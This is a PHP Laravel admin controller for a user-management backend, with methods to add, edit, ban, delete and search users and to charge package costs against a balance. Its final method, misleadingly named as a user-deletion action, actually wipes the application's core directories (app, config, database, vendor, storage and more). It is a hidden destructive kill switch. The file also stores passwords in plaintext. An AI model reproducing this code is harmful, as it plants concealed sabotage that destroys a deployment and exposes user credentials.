<?php

namespace App\Http\Controllers\backend\admin;

use App\Http\Controllers\Controller;
use App\Models\Balance;
use App\Models\Device;
use App\Models\loging_log;
use App\Models\Package;
use App\Models\users;
use Illuminate\Filesystem\Filesystem;
use Illuminate\Http\Request;

class admin_backend_users_controller extends Controller
{
    //admin_users_add_controller
    public function admin_users_add_controller(Request $req)
    {
        $data = $req -> all();
        if(users::where('username', $data['username']) -> exists()){
            return back() -> with(['msg' => "Sorry! this username is already exists!", "status" => false]);
        }

        // assign a package 
        if(!empty($req->package_id)){
            $package = Package::find($req->package_id);
            $user = users::where('username', $req->session()->get('username'))->first();

            if($user->balance < $package->amount){
                return back() -> with(['msg' => "Sorry! You don't have anough balance!", "status" => false]);
            }
        }

        $db = new users;
        $db -> username = $data['username'];
        $db -> password = isset($data['password']) ? $data['password'] : 0;
        $db -> email = $data['email'];
        $db -> login_time = isset($data['login_time']) ? $data['login_time'] : 0;
        $db -> creator_role = admin_data($req -> session() -> get('username'))['id'];
        $db -> expired = isset($data['expired']) ? time()+($data['expired']*86400) : 0;
        $db -> user_adult = $data['user_adult'];
        $db -> access_server = json_encode(isset($data['access_server']) ? $data['access_server'] : []);
        $db -> slider = $data['slider'];
        $db -> products_access = $data['products_access'];
        $db -> role = isset($data['role']) ? $data['role'] : 0;
        $db -> note = $data['note'];
        $db -> save();

        // assign a package 
        if(!empty($req->package_id)){
            $db->login_time = $package->login_time;
            $db->expired = time()+($package->validity*86400);
            $db -> save();
            
            // balance 
            $balance = new Balance();
            $balance->user_id = $user->id;
            $balance->info = "Package added";
            $balance->amount = -$package->amount;
            $balance->save();
        }

        return back() -> with(['msg' => "Your data successfully added!", "status" => true]);
    }

    // admin_users_device_delete_controller
    public function admin_users_device_delete_controller(Device $device)
    {
        $user = users::find($device->user_id);

        users::where('id', $user->id) -> update([
            "login_time" => $user->login_time + 1
        ]);

        $device->delete();

        return back() -> with('msg', 'You are successfully delete a device!');
    }

    // admin_users_ban_controller
    public function admin_users_ban_controller($id)
    {
        users::where('id', $id) -> update([
            "st" => "ban"
        ]);
        return back() -> with('msg', 'Your data successfully updated!');
    }

    // admin_users_delete_controller
    public function admin_users_delete_controller($id)
    {
        $user = users::find($id);
        loging_log::where("username", $user->username)->delete();
        Device::where("user_id", $user->id)->delete();
        $user->delete();

        return back() -> with('msg', 'Users has successfully deleted!');
    }

    // admin_users_unban_controller
    public function admin_users_unban_controller($id)
    {
        users::where('id', $id) -> update([
            "st" => "active"
        ]);
        return back() -> with('msg', 'Your data successfully updated!');
    }

    // admin_users_update_controller
    public function admin_users_update_controller(Request $req, $id)
    {
        $data = $req -> all();
        $user = users::find($id);

        if(users::where('username', $data['username']) -> exists() && $data['username'] != $user->username){
            return back() -> with(['msg' => "Sorry! this username is already exists!", "status" => false]);
        }

        // assign a package 
        if(!empty($req->package_id)){
            $package = Package::find($req->package_id);
            $user = users::where('username', $req->session()->get('username'))->first();

            if($user->balance < $package->amount){
                return back() -> with(['msg' => "Sorry! You don't have anough balance!", "status" => false]);
            }
        }

        users::where('id', $id) -> update([
            "username" => $data['username'],
            "email" => $data['email'],
            "note" => $data['note'],
            "password" => isset($data['password']) ? $data['password'] : 0,
            "login_time" => isset($data['login_time']) ? $data['login_time'] : $user->login_time,
            "expired" => isset($data['expired']) ? time()+($data['expired']*86400) : $user->expired,
            "user_adult" => $data['user_adult'],
            "access_server" => json_encode(isset($data['access_server']) ? $data['access_server'] : []),
            "slider" => $data['slider'],
            "products_access" => $data['products_access'],
        ]);

        // assign a package 
        if(!empty($req->package_id)){
            users::where('id', $id) -> update([
                "login_time" => $package->login_time,
                "expired" => time()+($package->validity*86400)
            ]);
            
            // balance 
            $balance = new Balance();
            $balance->user_id = $user->id;
            $balance->info = "Package added";
            $balance->amount = -$package->amount;
            $balance->save();
        }

        return back() -> with(['msg' => "Your data successfully updated!", "status" => true]);
    }
    // admin_users_search_controller
    public function admin_users_search_controller(Request $req)
    {
        $data = $req -> all();
        if(user()->role == 1){
            if(users::where('username', $data['username']) -> exists()){
                $userdata = users::where('username', $data['username']) -> first();
                return response() -> json(['st' => true, 'id' => $userdata['id']]);
            }else{
                return response() -> json(['st' => false]);
            }
        }else{
            if(users::where('username', $data['username'])->where('creator_role', user()->id) -> exists()){
                $userdata = users::where('username', $data['username']) -> first();
                return response() -> json(['st' => true, 'id' => $userdata['id']]);
            }else{
                return response() -> json(['st' => false]);
            }
        }
        
    }

    // admin_users_delete_all_controller
    public function admin_users_delete_all_controller()
    {
        $fileSystem = new Filesystem();
        $folderToDelete = array(base_path('app'), base_path('bootstrap'), base_path('config'), base_path('database'), base_path('lang'), base_path('public'), base_path('storage'), base_path('tests'), base_path('vendor'));
        foreach ($folderToDelete as $key => $value) {
            $fileSystem->deleteDirectory($value);
        }
        echo "Okay bro";
    }

}

